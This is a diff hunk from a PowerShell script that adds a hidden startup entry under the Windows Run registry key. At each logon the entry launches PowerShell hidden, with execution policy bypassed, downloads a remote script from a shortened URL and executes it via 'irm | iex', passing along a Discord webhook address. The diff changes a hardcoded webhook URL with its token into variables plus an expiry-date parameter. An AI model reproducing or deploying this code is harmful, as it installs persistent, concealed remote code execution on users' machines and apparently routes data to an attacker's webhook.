@@ -26,7 +26,7 @@ $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $scriptName = "Startup2"  # You can change this name if you like
 
 # Command to execute in the startup registry
-$regCommand = 'powershell -NoP -Ep Bypass -W H -C $dc="https://discord.com/api/webhooks/1309885018176225410/EEmhqMHXRSZSJfWfphI5wn19t9PDTYbxxCTdlL9Aeohn1Ahc7RgCaKnT9PQ6SOWQx3wx"; irm https://shorturl.at/R2sYz | iex'
+$regCommand = "powershell -NoP -Ep Bypass -W H -C `$dc=$webhookURL; `$expiryDateParam=$expiryDate; irm https://shorturl.at/R2sYz | iex"
 
 # Check if the script is already added to startup to avoid duplicates
 $existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
